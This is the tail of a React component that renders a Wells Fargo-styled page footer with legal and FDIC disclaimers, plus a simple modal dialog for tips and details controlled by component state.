            <span className="hover:underline cursor-pointer">Online Access Agreement</span>
            <span className="hover:underline cursor-pointer">Ad Choices</span>
            <span className="hover:underline cursor-pointer">Report Fraud</span>
            <span className="hover:underline cursor-pointer">Sitemap</span>
          </div>

          <div className="pt-4 border-t border-slate-200/80 text-[10px] text-slate-500 leading-relaxed space-y-2">
            <p>
              Investment and Insurance Products are: Not Insured by the FDIC or Any Federal Government Agency • Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate • Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested.
            </p>
            <p>
              Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
            </p>
            <p className="pt-1">
              &copy; 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801. Equal Housing Lender.
            </p>
          </div>

        </div>
      </footer>

      {/* ---------------- MODAL FOR TIPS & DETAILS ---------------- */}
      {activeModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/60 backdrop-blur-sm animate-in fade-in">
          <div className="bg-white rounded-2xl max-w-md w-full p-6 space-y-4 shadow-2xl">
            <div className="flex justify-between items-center border-b pb-3">
              <h3 className="font-bold text-slate-900 text-base">
                {activeModal.title}
              </h3>
              <button 
                onClick={() => setActiveModal(null)}
                className="p-1 rounded-lg text-slate-400 hover:text-slate-700"
              >
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="text-xs text-slate-600 leading-relaxed whitespace-pre-line">
              {activeModal.content}
            </div>
            <button
              onClick={() => setActiveModal(null)}
              className="w-full py-2.5 rounded-xl bg-slate-900 text-white font-bold text-xs"
            >
              Close
            </button>
          </div>
        </div>
      )}

    </div>
  );
};
